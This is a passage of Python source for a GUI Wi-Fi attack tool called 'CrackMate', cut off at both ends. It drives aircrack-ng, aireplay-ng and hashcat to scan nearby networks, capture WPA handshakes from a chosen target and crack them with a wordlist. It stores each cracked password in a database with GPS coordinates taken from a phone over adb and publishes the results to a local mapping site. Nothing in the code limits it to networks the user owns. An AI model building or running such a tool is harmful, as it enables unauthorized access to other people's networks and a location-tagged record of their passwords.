            main_queue.put(("location_result", (None, None)))
            return

        proc_output = subprocess.run(["adb", "shell", "dumpsys", "location"], capture_output=True, text=True, timeout=25, check=True)
        output = proc_output.stdout

        fused_matches = re.findall(r'Location\[fused\s+([-+]?\d{1,3}\.\d+(?:E-?\d+)?),([-+]?\d{1,3}\.\d+(?:E-?\d+)?).*?acc=([\d.]+).*?time=(\d+)', output)
        if fused_matches:
            fused = max(fused_matches, key=lambda x: int(x[3])) 
            lat, lon = fused[0], fused[1]
            log_to_gui(f"Found Fused Location: Lat={lat}, Lon={lon} (Accuracy={fused[2]}m)")
        else:
            gps_match = re.search(r'Location\[gps\s+([-+]?\d{1,3}\.\d+(?:E-?\d+)?),([-+]?\d{1,3}\.\d+(?:E-?\d+)?).*?acc=([\d.]+)', output)
            if gps_match:
                lat, lon = gps_match.group(1), gps_match.group(2)
                log_to_gui(f"Found GPS Location: Lat={lat}, Lon={lon} (Accuracy={gps_match.group(3)}m)")
            else:
                net_match = re.search(r'Location\[network\s+([-+]?\d{1,3}\.\d+(?:E-?\d+)?),([-+]?\d{1,3}\.\d+(?:E-?\d+)?).*?acc=([\d.]+)', output)
                if net_match:
                    lat, lon = net_match.group(1), net_match.group(2)
                    log_to_gui(f"Found Network Location: Lat={lat}, Lon={lon} (Accuracy={net_match.group(3)}m)")
                else:
                    last_gps_match = re.search(r'last location=Location\[gps\s+([-+]?\d{1,3}\.\d+),([-+]?\d{1,3}\.\d+)', output)
                    if last_gps_match:
                        lat, lon = last_gps_match.group(1), last_gps_match.group(2)
                        log_to_gui(f"Found Last GPS Location (no accuracy): Lat={lat}, Lon={lon}")
                    else:
                        log_to_gui("Could not find detailed location data in dumpsys output.")

    except subprocess.CalledProcessError as e:
        log_to_gui(f"ADB Error (dumpsys): {e.stderr or e.stdout or e}")
    except subprocess.TimeoutExpired:
        log_to_gui("ADB command 'dumpsys location' timed out.")
    except FileNotFoundError:
        log_to_gui("Error: 'adb' command not found.")
    except Exception as e:
        log_to_gui(f"Unexpected error retrieving ADB location: {e}")
    main_queue.put(("location_result", (lat, lon)))

def save_scan_data_task(networks_to_save, lat, lon):
    num_networks = len(networks_to_save)
    log_to_gui(f"\nSaving/Updating {num_networks} network{'s' if num_networks != 1 else ''} in {WIFI_DB_FILE}...")
    if not networks_to_save:
        main_queue.put(("save_result", (False, "No data to save")))
        return

    conn = None
    try:
        conn = sqlite3.connect(WIFI_DB_FILE)
        cursor = conn.cursor()
        
        saved_or_updated_count = 0
        current_timestamp = datetime.now().isoformat() 

        for net_data in networks_to_save:
            if not isinstance(net_data, dict): continue 
            bssid = net_data.get("bssid")
            if not bssid: continue 

            current_lat_for_db, current_lon_for_db = None, None
            if lat is not None:
                try: current_lat_for_db = float(lat)
                except (ValueError, TypeError): pass
            if lon is not None:
                try: current_lon_for_db = float(lon)
                except (ValueError, TypeError): pass

            val_ssid = net_data.get("ssid")
            val_power = net_data.get("power") 
            val_channel_orig = net_data.get("channel") 
            val_channel_str = str(val_channel_orig) if val_channel_orig is not None else None
            val_encryption = net_data.get("encryption")
            
            val_band = get_band_from_channel(val_channel_orig)

            val_hs_captured = net_data.get("handshake_captured") 
            val_password = net_data.get("password")
            val_hs_filepath = net_data.get("handshake_filepath")

            try:
                cursor.execute('''
                    INSERT INTO networks (bssid, ssid, power, channel, encryption, latitude, longitude, last_seen,
                                          handshake_captured, password, handshake_filepath, band)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ON CONFLICT(bssid) DO UPDATE SET
                        ssid = COALESCE(excluded.ssid, networks.ssid),
                        power = COALESCE(excluded.power, networks.power), /* Stronger signal (lower neg number) is better */
                        channel = COALESCE(excluded.channel, networks.channel), 
                        encryption = COALESCE(excluded.encryption, networks.encryption),
                        
                        /* Update location if new location is provided, otherwise keep existing */
                        latitude = CASE WHEN excluded.latitude IS NOT NULL THEN excluded.latitude ELSE networks.latitude END,
                        longitude = CASE WHEN excluded.longitude IS NOT NULL THEN excluded.longitude ELSE networks.longitude END,
                        last_seen = excluded.last_seen, /* Always update last_seen */

                        /* Update handshake_captured only if new value is 1 (True) */
                        handshake_captured = CASE
                            WHEN excluded.handshake_captured = 1 THEN 1
                            ELSE networks.handshake_captured
                        END,
                        password = COALESCE(excluded.password, networks.password), /* Update password if new one provided */
                        handshake_filepath = COALESCE(excluded.handshake_filepath, networks.handshake_filepath),
                        band = COALESCE(excluded.band, networks.band) /* Update band if new one provided */
                ''', (bssid, val_ssid, val_power, val_channel_str, val_encryption,
                      current_lat_for_db, current_lon_for_db, current_timestamp,
                      val_hs_captured, val_password, val_hs_filepath, val_band))

                if cursor.rowcount > 0:
                    saved_or_updated_count += 1

            except sqlite3.Error as e_sql:
                log_to_gui(f"SQLite error saving/updating {bssid}: {e_sql}")
            except Exception as e_item: 
                log_to_gui(f"Error preparing data for {bssid}: {e_item}")
        conn.commit()
        log_to_gui(f"{saved_or_updated_count} network records processed (inserted/updated) in {WIFI_DB_FILE}")
        main_queue.put(("save_result", (True, f"{saved_or_updated_count} processed")))
    except sqlite3.Error as e:
        log_to_gui(f"Database Error: {e} while saving to {WIFI_DB_FILE}")
        main_queue.put(("save_result", (False, str(e))))
    except Exception as e_gen: 
        log_to_gui(f"General Data Saving Error: {e_gen}")
        traceback.print_exc()
        main_queue.put(("save_result", (False, str(e_gen))))
    finally:
        if conn:
            conn.close()

def export_table_to_json(db_path, table_name, json_filename):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM {table_name}")
    rows = cursor.fetchall()
    columns = [description[0] for description in cursor.description]
    data = [dict(zip(columns, row)) for row in rows]

    output_dir = "wifi-mapper"
    os.makedirs(output_dir, exist_ok=True)
    json_path = os.path.join(output_dir, json_filename)

    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    conn.close()
    log_to_gui(f"Data exported to JSON: {json_path}") 

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.1) 
        try:
            return s.connect_ex(("localhost", port)) == 0
        except socket.error: 
            return False

class WifiToolApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CrackMate")
        self.geometry("850x750")
        self.configure(background='white')

        self.http_server_process = None 

        self.window_icon_tk = None
        self.app_logo_tk = None
        if WINDOW_ICON_PATH and os.path.exists(WINDOW_ICON_PATH):
            try:
                self.window_icon_tk = tk.PhotoImage(file=WINDOW_ICON_PATH)
                self.iconphoto(True, self.window_icon_tk)
            except tk.TclError:
                log_to_gui("Warning: Could not load window icon (try PNG).")

        style = ttk.Style(self)
        style.configure(".", background="white", foreground="black", relief="flat")
        style.configure("TFrame", background="white")
        style.configure("TLabel", background="white", foreground="black")
        style.configure("TLabelframe", background="white", bordercolor="lightgrey")
        style.configure("TLabelframe.Label", background="white", foreground="black")
        style.configure("TButton", foreground="black", background="#f0f0f0", relief="raised", padding=3)
        style.map("TButton", background=[('active', '#e0e0e0')])
        style.configure("Treeview", background="white", fieldbackground="white", foreground="black")
        style.configure("Treeview.Heading", background="#e8e8e8", foreground="black", relief="flat", font=('Helvetica', 9, 'bold'))
        style.configure("TNotebook", background="white", tabmargins=[2, 5, 2, 0])
        style.configure("TNotebook.Tab", background="#e0e0e0", foreground="black", padding=[8, 2], relief="raised")
        style.map("TNotebook.Tab",
                  background=[("selected", "white"), ('active', '#f0f0f0')],
                  relief=[("selected", "flat"), ("active", "raised")])
        style.configure("TEntry", fieldbackground="white", foreground="black", background="white")
        style.configure("TCombobox", fieldbackground="white", foreground="black", background="white", arrowcolor="black")
        style.map("TCombobox",
                  fieldbackground=[('readonly', 'white'), ('disabled', '#f0f0f0')],
                  foreground=[('readonly', 'black'), ('disabled', 'grey')])
        style.configure("TScrollbar", background="#f0f0f0", troughcolor="white", bordercolor="#d0d0d0", arrowcolor="black")
        style.map("TScrollbar", background=[('active', '#d0d0d0')])

        if os.geteuid() != 0:
            messagebox.showwarning("Permissions", "Run with 'sudo' for full functionality.")
        
        essential_cmds = ["sudo", "ip", "iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "hashcat", "hcxpcapngtool", "python3"]
        missing_cmds = [cmd for cmd in essential_cmds if not check_command(cmd)]
        if missing_cmds:
            messagebox.showerror("Dependencies Missing", f"Essential tools missing: {', '.join(missing_cmds)}\nPlease install them.")
        
        create_dirs()
        ensure_db_exists()

        self.monitor_interface = None
        self.current_scan_results = []
        self.selected_wordlist = tk.StringVar(value=WORDLIST)
        self.latitude = None
        self.longitude = None
        self.network_item_map = {}
        self.handshake_item_map = {}
        self.network_pending_db_save = None
        self.pending_monitor_start_iface = None

        self.notebook = ttk.Notebook(self)
        self.tab_scan = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.tab_scan, text=' Scan & Capture ')
        self.create_scan_tab()
        self.tab_crack = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.tab_crack, text=' Crack Handshake ')
        self.create_crack_tab()
        self.notebook.pack(expand=True, fill='both', padx=5, pady=5)

        log_frame = ttk.LabelFrame(self, text="Log", padding=5)
        log_frame.pack(expand=True, fill='both', padx=5, pady=(0, 0))
        self.log_area = scrolledtext.ScrolledText(log_frame, height=8, wrap=tk.WORD, state='disabled', font=("monospace", 9))
        self.log_area.pack(expand=True, fill='both', padx=5, pady=5)
        self.log_area.tag_config("ERROR", foreground="red")
        self.log_area.tag_config("WARNING", foreground="orange")
        self.log_area.tag_config("SUCCESS", foreground="green")
        self.log_area.tag_config("INFO", foreground="blue")

        self.status_var = tk.StringVar()
        self.status_bar = ttk.Label(self, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W, padding=(5, 2))
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X, pady=(2, 0))
        self.status_var.set("Ready. Sudo execution recommended.")

        self.after(100, self.process_queue)
        self.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.refresh_interfaces()
        self.refresh_handshake_list()

    def log_message(self, message, level="NORMAL"):
        try:
            self.log_area.config(state='normal')
            tag = ()
            str_message = str(message)
            str_level = str(level).upper()
            if any(s in str_level or s in str_message.upper() for s in ["ERROR", "FAIL", "FAILED"]):
                tag = ("ERROR",)
            elif any(s in str_level or s in str_message.upper() for s in ["WARNING", "WARN"]):
                tag = ("WARNING",)
            elif any(s in str_level or s in str_message.upper() for s in ["SUCCESS", "FOUND", "CAPTURED", "CRACKED"]):
                tag = ("SUCCESS",)
            elif any(s in str_message for s in ["Executing", "---", "Attempting", "Starting", "Stopping", "Saving"]):
                tag = ("INFO",)
            self.log_area.insert(tk.END, str_message + '\n', tag)
            self.log_area.config(state='disabled')
            self.log_area.see(tk.END)
        except Exception as e:
            print(f"CONSOLE LOG ERROR: {e}\nOriginal msg: {message}")

    def update_status(self, message):
        self.status_var.set(message)

    def process_queue(self):
        try:
            while True:
                msg_type, data = main_queue.get_nowait()
                try:
                    if msg_type == "log":
                        self.log_message(data)
                    elif msg_type == "status":
                        self.update_status(data)
                    elif msg_type == "set_pending_monitor_start":
                        self.pending_monitor_start_iface = data
                    else:
                        handler = getattr(self, f"handle_{msg_type}", None)
                        if handler:
                            handler(data)
                        else:
                            print(f"CONSOLE: No GUI handler for unexpected msg type '{msg_type}'")
                except Exception as e_h:
                    print(f"CONSOLE: Handler exc for '{msg_type}': {e_h}")
                    traceback.print_exc()
                finally:
                    self.update_idletasks()
        except queue.Empty:
            pass
        except Exception as e_q:
            print(f"CONSOLE: Error in process_queue main loop: {e_q}")
            traceback.print_exc()
        finally:
            self.after(100, self.process_queue)


    def create_scan_tab(self):
        f1 = ttk.Frame(self.tab_scan)
        f1.pack(pady=5, fill=tk.X)
        ttk.Label(f1, text="Interface:").pack(side=tk.LEFT, padx=(0, 5))
        self.interface_combo = ttk.Combobox(f1, state="readonly", width=15)
        self.interface_combo.pack(side=tk.LEFT, padx=5)
        self.refresh_interfaces_button = ttk.Button(f1, text="Refresh", command=self.refresh_interfaces)
        self.refresh_interfaces_button.pack(side=tk.LEFT, padx=5)
        self.monitor_start_button = ttk.Button(f1, text="▶ Start Mon", command=self.start_monitor_mode)
        self.monitor_start_button.pack(side=tk.LEFT, padx=10)

        if APP_LOGO_PATH and os.path.exists(APP_LOGO_PATH):
            try:
                img_pil = Image.open(APP_LOGO_PATH)
                logo_height = 64 
                img_ratio = img_pil.width / img_pil.height
                logo_width = int(logo_height * img_ratio)
                img_pil_resized = img_pil.resize((logo_width, logo_height), Image.Resampling.LANCZOS)
                self.app_logo_tk = ImageTk.PhotoImage(img_pil_resized)
                ttk.Label(f1, image=self.app_logo_tk, background="white").pack(side=tk.RIGHT, padx=20, anchor='e')
            except Exception as e_logo:
                log_to_gui(f"App logo load error: {e_logo}")

        f2 = ttk.Frame(self.tab_scan)
        f2.pack(pady=5, fill=tk.X)
        self.scan_button = ttk.Button(f2, text="📡 Scan", command=self.start_scan, state=tk.DISABLED)
        self.scan_button.pack(side=tk.LEFT, padx=0)
        self.stop_scan_button = ttk.Button(f2, text="Stop Scan", command=self.stop_scan, state=tk.DISABLED)
        self.stop_scan_button.pack(side=tk.LEFT, padx=10)

        lf = ttk.LabelFrame(self.tab_scan, text="Scanned Networks", padding=5)
        lf.pack(expand=True, fill="both", pady=5)
        cols = ("SSID", "BSSID", "Pwr", "Ch", "Encryption", "Cli", "HS")
        self.network_tree = ttk.Treeview(lf, columns=cols, show="headings", selectmode="extended")
        for c in cols:
            self.network_tree.heading(c, text=c, anchor=tk.W)
        w = {"SSID": 160, "BSSID": 140, "Pwr": 50, "Ch": 40, "Encryption": 180, "Cli": 60, "HS": 70}
        a = {"Pwr": "center", "Ch": "center", "Cli": "center", "HS": "center"}
        for c in cols:
            self.network_tree.column(c, width=w[c], anchor=a.get(c, tk.W), stretch=tk.YES if c in ["SSID", "Encryption"] else tk.NO)
        vsb = ttk.Scrollbar(lf, orient="vertical", command=self.network_tree.yview)
        hsb = ttk.Scrollbar(lf, orient="horizontal", command=self.network_tree.xview)
        self.network_tree.config(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        vsb.pack(side="right", fill="y")
        hsb.pack(side="bottom", fill="x")
        self.network_tree.pack(expand=True, fill="both")

        f3 = ttk.Frame(self.tab_scan)
        f3.pack(pady=5, fill=tk.X)
        self.check_clients_button = ttk.Button(f3, text="Check Cli", command=self.check_selected_clients, state=tk.DISABLED)
        self.check_clients_button.pack(side=tk.LEFT, padx=(0, 5))
        self.capture_button = ttk.Button(f3, text="Capture HS", command=self.capture_selected_handshakes, state=tk.DISABLED)
        self.capture_button.pack(side=tk.LEFT, padx=5)
        self.stop_capture_button = ttk.Button(f3, text="Stop Capture", command=self.stop_capture, state=tk.DISABLED)
        self.stop_capture_button.pack(side=tk.LEFT, padx=5)
        
    def create_crack_tab(self):
        f1 = ttk.Frame(self.tab_crack)
        f1.pack(pady=10, fill=tk.X)
        ttk.Label(f1, text="Wordlist:").pack(side=tk.LEFT, padx=(0, 5))
        self.wordlist_entry = ttk.Entry(f1, textvariable=self.selected_wordlist, width=50)
        self.wordlist_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.browse_wordlist_button = ttk.Button(f1, text="Browse...", command=self.browse_wordlist)
        self.browse_wordlist_button.pack(side=tk.LEFT, padx=5)

        lf = ttk.LabelFrame(self.tab_crack, text="Captured Handshakes (.cap)", padding=5)
        lf.pack(expand=True, fill="both", pady=5)
        cols = ("Filename", "SSID", "BSSID", "Status")
        self.handshake_tree = ttk.Treeview(lf, columns=cols, show="headings", selectmode="extended")
        for c in cols:
            self.handshake_tree.heading(c, text=c, anchor=tk.W)
        w = {"Filename": 250, "SSID": 150, "BSSID": 140, "Status": 160}
        s = {"Filename": tk.YES, "SSID": tk.YES, "BSSID": tk.NO, "Status": tk.NO} 
        for c in cols:
            self.handshake_tree.column(c, width=w[c], anchor=tk.W, stretch=s[c])
        vsb = ttk.Scrollbar(lf, orient="vertical", command=self.handshake_tree.yview)
        hsb = ttk.Scrollbar(lf, orient="horizontal", command=self.handshake_tree.xview)
        self.handshake_tree.config(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        vsb.pack(side="right", fill="y")
        hsb.pack(side="bottom", fill="x")
        self.handshake_tree.pack(expand=True, fill="both")

        f2 = ttk.Frame(self.tab_crack)
        f2.pack(pady=10, fill=tk.X)
        self.refresh_handshakes_button = ttk.Button(f2, text="Refresh List", command=self.refresh_handshake_list)
        self.refresh_handshakes_button.pack(side=tk.LEFT, padx=0)
        self.crack_button = ttk.Button(f2, text="Crack Selected", command=self.crack_selected_handshakes, state=tk.DISABLED)
        self.crack_button.pack(side=tk.LEFT, padx=10)
        self.stop_crack_button = ttk.Button(f2, text="Stop Cracking (Sel)", command=self.stop_selected_cracking, state=tk.DISABLED)
        self.stop_crack_button.pack(side=tk.LEFT, padx=5)
        self.open_site_button = ttk.Button(f2, text="Open Site", command=self.open_website)
        self.open_site_button.pack(side=tk.LEFT, padx=15)

    def refresh_interfaces(self):
        self.update_status("Refreshing interfaces...")
        self.interface_combo['values'] = []
        self.interface_combo.set('')
        interfaces = get_interfaces()
        if interfaces:
            f_interfaces = [i for i in interfaces if i != self.monitor_interface] 
            if not f_interfaces and self.monitor_interface: 
                self.interface_combo['values'] = [self.monitor_interface]
                self.interface_combo.set(self.monitor_interface)
            elif f_interfaces: 
                self.interface_combo['values'] = f_interfaces
                self.interface_combo.current(0)
            else: 
                 self.interface_combo.set('')
            self.update_status("Interfaces refreshed.")
        else:
            log_to_gui("No suitable wireless interfaces found.")
            self.update_status("No interfaces found.")
        self.monitor_start_button.config(state=tk.NORMAL if not self.monitor_interface and self.interface_combo.get() else tk.DISABLED)

    def start_monitor_mode(self):
        iface = self.interface_combo.get()
        if not iface:
            messagebox.showerror("Error", "Select an interface.")
            return
        if self.monitor_interface: 
            if messagebox.askyesno("Monitor Active", f"Monitor mode is already active on {self.monitor_interface}.\nStop it and start on {iface}?"):
                self.stop_monitor_mode(callback_iface_to_start=iface) 
            return
        self.update_status(f"Starting monitor mode on {iface}...")
        self.monitor_start_button.config(state=tk.DISABLED)
        self.refresh_interfaces_button.config(state=tk.DISABLED)
        self.interface_combo.config(state=tk.DISABLED)
        threading.Thread(target=monitor_mode_task, args=(iface,), daemon=True).start()

    def stop_monitor_mode(self, callback_iface_to_start=None):
        if not self.monitor_interface:
            if callback_iface_to_start: 
                log_to_gui(f"No active monitor mode. Attempting to start on {callback_iface_to_start}.")
                self.interface_combo.set(callback_iface_to_start)
                self.start_monitor_mode()
            return
        self.update_status(f"Stopping monitor mode on {self.monitor_interface}...")
        if scan_process_obj and scan_process_obj.poll() is None:
            self.stop_scan()
        if capture_process_obj and capture_process_obj.poll() is None:
            self.stop_capture()
        main_queue.put(("set_pending_monitor_start", callback_iface_to_start)) 
        threading.Thread(target=stop_monitor_mode_task, args=(self.monitor_interface,), daemon=True).start()

    def start_scan(self):
        if not self.monitor_interface:
            messagebox.showerror("Error", "Monitor mode must be active to scan.")
            return
        if scan_process_obj and scan_process_obj.poll() is None: 
            messagebox.showwarning("Busy", "A scan is already in progress.")
            return
        self.update_status(f"Starting scan on {self.monitor_interface}...")
        self.scan_button.config(state=tk.DISABLED)
        self.stop_scan_button.config(state=tk.NORMAL)
        self.network_tree.delete(*self.network_tree.get_children()) 
        self.network_item_map.clear()
        self.current_scan_results = []
        for btn in [self.check_clients_button, self.capture_button]: 
            btn.config(state=tk.DISABLED)
        threading.Thread(target=scan_wifi_networks_task, args=(self.monitor_interface, 30), daemon=True).start() 

    def stop_scan(self):
        global scan_process_obj 
        if scan_process_obj and scan_process_obj.poll() is None:
            terminate_process(scan_process_obj, "Network Scan")
            scan_process_obj = None 
            self.update_status("Network scan stopped.")
        self.stop_scan_button.config(state=tk.DISABLED)
        if self.monitor_interface: 
            self.scan_button.config(state=tk.NORMAL)

    def check_selected_clients(self):
        if not self.monitor_interface:
            messagebox.showerror("Error", "Monitor mode must be active.")
            return
        selected_ids = self.network_tree.selection()
        if not selected_ids:
            messagebox.showinfo("Info", "Select network(s) to check for clients.")
            return
        count = 0
        for item_id in selected_ids:
            vals = self.network_tree.item(item_id, 'values')
            if len(vals) >= 4 and vals[1] and str(vals[3]).strip().isdigit():
                self.network_tree.set(item_id, "Cli", "Chk...") 
                threading.Thread(target=check_for_clients_task, args=(self.monitor_interface, vals[1], int(str(vals[3]).strip())), daemon=True).start()
                count += 1
            else:
                self.network_tree.set(item_id, "Cli", "InvData")
        if count == 0:
            self.update_status("No valid networks selected for client check.")

    def capture_selected_handshakes(self):
        global capture_process_obj 
        if capture_process_obj and capture_process_obj.poll() is None:
            messagebox.showwarning("Busy", "A capture is already in progress.")
            return
        if not self.monitor_interface:
            messagebox.showerror("Error", "Monitor mode must be active.")
            return
        selected_ids = self.network_tree.selection()
        if not selected_ids or len(selected_ids) > 1:
            messagebox.showinfo("Info", "Select ONE network to capture handshake.")
            return
        item_id = selected_ids[0]
        vals = self.network_tree.item(item_id, 'values')
        if len(vals) < 5 or not str(vals[3]).strip().isdigit(): 
            messagebox.showerror("Error", "Incomplete or invalid network data selected.")
            return

        ssid, bssid, channel_str, enc = vals[0], vals[1], str(vals[3]).strip(), vals[4]
        if "WPA" not in enc.upper():
            if not messagebox.askyesno("Confirm Capture", f"Network '{ssid}' ({enc}) may not use WPA encryption. Capture handshake anyway?"):
                return

        self.update_status(f"Attempting handshake capture for {ssid}...")
        self.capture_button.config(state=tk.DISABLED)
        self.stop_capture_button.config(state=tk.NORMAL)
        for btn in [self.scan_button, self.check_clients_button]: 
            btn.config(state=tk.DISABLED)
        self.network_tree.set(item_id, "HS", "Cap...") 
        threading.Thread(target=capture_handshake_task, args=(self.monitor_interface, bssid, int(channel_str), ssid), daemon=True).start()

    def stop_capture(self):
        global capture_process_obj 
        if capture_process_obj and capture_process_obj.poll() is None:
            terminate_process(capture_process_obj, "Handshake Capture")
            capture_process_obj = None 
            self.update_status("Handshake capture stopped.")
        self.stop_capture_button.config(state=tk.DISABLED)
        if self.monitor_interface: 
            for btn in [self.capture_button, self.check_clients_button, self.scan_button]:
                btn.config(state=tk.NORMAL)

    def browse_wordlist(self):
        path = filedialog.askopenfilename(title="Select Wordlist", filetypes=(("Text files", "*.txt"), ("RockYou list", "rockyou.txt"), ("All files", "*.*")))
        if path:
            self.selected_wordlist.set(path)
            log_to_gui(f"Wordlist selected: {path}")

    def refresh_handshake_list(self):
        self.update_status("Refreshing handshake list...")
        self.crack_button.config(state=tk.DISABLED) 
        self.stop_crack_button.config(state=tk.DISABLED)
        threading.Thread(target=self.load_handshake_files_task, daemon=True).start()

    def load_handshake_files_task(self):
        hs_data_list = []
        try:
            if not os.path.isdir(HANDSHAKE_DIR):
                main_queue.put(("handshake_files_loaded", []))
                return
            cap_files = sorted(glob.glob(os.path.join(HANDSHAKE_DIR, "*.cap")), key=os.path.getmtime, reverse=True)
            for fp in cap_files:
                fn = os.path.basename(fp)
                bssid_m = re.search(r'(([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2})', fn)
                bssid_s = bssid_m.group(1).replace('-', ':').upper() if bssid_m else "N/A"
                
                ssid_s = "UnknownSSID"

                temp_fn = fn.replace(".cap", "")
                if bssid_s != "N/A":
                    temp_fn = temp_fn.replace(bssid_s.replace(":", "-"), "") 
                    temp_fn = temp_fn.replace(bssid_s.replace(":", ""), "")   
                temp_fn = temp_fn.replace("handshake_", "").replace("__", "_").strip('_ ')
                if temp_fn: ssid_s = temp_fn.replace('_', ' ')


                status = "Ready" 
                if bssid_s != "N/A":
                    cr_fp = os.path.join(CRACKED_DIR, f"cracked_{bssid_s.replace(':', '-')}.txt")
                    if os.path.exists(cr_fp) and os.path.getsize(cr_fp) > 0:
                        with open(cr_fp, 'r', encoding='utf-8') as f_pwd:
                            pwd = f_pwd.read().strip()
                            status = f"FOUND: {pwd}" if pwd else "Cracked (Empty)"
                    elif bssid_s in crack_processes and crack_processes[bssid_s].poll() is None:
                        status = "Cracking..." 
                hs_data_list.append({"filepath": fp, "filename": fn, "ssid": ssid_s, "bssid": bssid_s, "status": status})
            main_queue.put(("handshake_files_loaded", hs_data_list))
        except Exception as e:
            log_to_gui(f"Error loading handshake files: {e}")
            traceback.print_exc()
            main_queue.put(("handshake_files_loaded", [])) 

    def crack_selected_handshakes(self):
        selected_iids = self.handshake_tree.selection() 
        if not selected_iids:
            messagebox.showinfo("Info", "Select handshake file(s) to crack.")
            return
        wordlist = self.selected_wordlist.get()
        if not os.path.exists(wordlist) or not os.path.isfile(wordlist):
            messagebox.showerror("Error", f"Invalid or non-existent wordlist: {wordlist}")
            return

        self.update_status("Preparing to crack selected handshakes...")
        self.crack_button.config(state=tk.DISABLED)
        self.refresh_handshakes_button.config(state=tk.DISABLED) 
        queued_count = 0
        for item_iid_filepath in selected_iids:
            data = self.handshake_item_map.get(item_iid_filepath) 
            if not data or data["bssid"] == "N/A" or "FOUND:" in data["status"] or "Cracking..." in data["status"]:
                continue 
            
            if os.path.exists(data["filepath"]):
                self.handshake_tree.set(item_iid_filepath, "Status", "Cracking...")
                data["status"] = "Cracking..." 
                threading.Thread(target=crack_handshake_task, args=(data["bssid"], data["ssid"], data["filepath"], wordlist), daemon=True).start()
                queued_count += 1
            else:
                self.handshake_tree.set(item_iid_filepath, "Status", "File Missing")
                data["status"] = "File Missing"
        
        if queued_count > 0:
            self.stop_crack_button.config(state=tk.NORMAL)
            self.update_status(f"Queued {queued_count} handshake(s) for cracking.")
        else:
            self.update_status("No new valid handshakes queued for cracking.")
            self.crack_button.config(state=tk.NORMAL if self.handshake_item_map else tk.DISABLED) 
            self.refresh_handshakes_button.config(state=tk.NORMAL)

    def stop_selected_cracking(self):
        selected_iids_filepaths = self.handshake_tree.selection()
        if not selected_iids_filepaths:
            messagebox.showinfo("Info", "Select cracking task(s) to stop.")
            return
        stopped_count = 0
        for item_iid_filepath in selected_iids_filepaths:
            data = self.handshake_item_map.get(item_iid_filepath)
            if not data or data["bssid"] not in crack_processes:
                continue 
            
            proc_to_stop = crack_processes[data["bssid"]]
            if proc_to_stop and proc_to_stop.poll() is None: 
                terminate_process(proc_to_stop, f"Cracking ({data['bssid']})")
                self.handshake_tree.set(item_iid_filepath, "Status", "Stopping...")
                data["status"] = "Stopping..." 
                stopped_count += 1
            elif data["bssid"] in crack_processes: 
                del crack_processes[data["bssid"]]
        
        if stopped_count > 0:
            self.update_status(f"Attempted to stop {stopped_count} cracking task(s).")
        else:
            self.update_status("No running cracking tasks selected to stop.")
        
        any_cracking_left = any("Cracking..." in d.get("status", "") or "Stopping..." in d.get("status", "") for d in self.handshake_item_map.values())
        self.stop_crack_button.config(state=tk.NORMAL if any_cracking_left else tk.DISABLED)
    	
    def start_http_server(self):
        if self.http_server_process and self.http_server_process.poll() is None:
            log_to_gui("Internal HTTP server is already running.")
            return True

        if is_port_in_use(8000):
            log_to_gui("Port 8000 is already in use by another process. Cannot start internal server.")
            return True 

        if not check_command("python3"):
             messagebox.showerror("Server Error", "'python3' command not found.\nCannot start HTTP server.")
             return False

        script_dir = os.path.dirname(os.path.abspath(__file__))
        site_dir = os.path.join(script_dir, "wifi-mapper")
        if not os.path.isdir(site_dir):
            log_to_gui(f"Error: Web site directory '{site_dir}' not found.")
            messagebox.showerror("Server Error", f"Web site directory not found:\n{site_dir}")
            return False

        try:
            self.http_server_process = subprocess.Popen(
                ["python3", "-m", "http.server", "8000"],
                cwd=site_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE, 
                preexec_fn=os.setsid if os.name != 'nt' else None 
            )
            time.sleep(0.2)
            if self.http_server_process.poll() is not None: 
                stderr_output = ""
                if self.http_server_process.stderr:
                    stderr_output = self.http_server_process.stderr.read().decode(errors='ignore').strip()
                log_to_gui(f"Failed to start HTTP server. It terminated quickly. Error: {stderr_output}")
                messagebox.showerror("Server Error", f"Failed to start HTTP server.\n{stderr_output}\nCheck logs for details.")
                self.http_server_process = None
                return False
            log_to_gui("Internal HTTP server started on port 8000.")
            return True
        except FileNotFoundError:
            log_to_gui("Error: 'python3' command not found. Cannot start HTTP server.")
            messagebox.showerror("Server Error", "'python3' command not found.\nCannot start HTTP server.")
            self.http_server_process = None
            return False
        except Exception as e:
            log_to_gui(f"Error starting HTTP server: {e}")
            messagebox.showerror("Server Error", f"An unexpected error occurred while starting the HTTP server:\n{e}")
            self.http_server_process = None
            return False

    def stop_http_server(self):
        if self.http_server_process and self.http_server_process.poll() is None:
            log_to_gui(f"Stopping internal HTTP server (PID: {self.http_server_process.pid})...")
            pgid = 0
            try:
                if os.name != 'nt': 
                    pgid = os.getpgid(self.http_server_process.pid)
                    os.killpg(pgid, signal.SIGTERM)
                else: 
                    self.http_server_process.terminate()
                
                self.http_server_process.wait(timeout=3)
                log_to_gui("Internal HTTP server stopped.")
            except ProcessLookupError:
                log_to_gui("HTTP server process already terminated.")
            except subprocess.TimeoutExpired:
                log_to_gui("HTTP server (SIGTERM/terminate) timeout. Sending SIGKILL/kill...")
                try:
                    if os.name != 'nt' and pgid != 0:
                        os.killpg(pgid, signal.SIGKILL)
                    else:
                        self.http_server_process.kill() 
                    self.http_server_process.wait(timeout=2)
                    log_to_gui("Internal HTTP server killed.")
                except Exception as e_kill:
                    log_to_gui(f"Error SIGKILL/kill HTTP server: {e_kill}")
            except AttributeError: 
                 log_to_gui("Process group functions not available. Using direct terminate/kill for HTTP server.")
                 try: 
                     self.http_server_process.terminate()
                     self.http_server_process.wait(timeout=3)
                 except subprocess.TimeoutExpired:
                     self.http_server_process.kill()
                     self.http_server_process.wait(timeout=2)
                 except Exception as e_direct_kill:
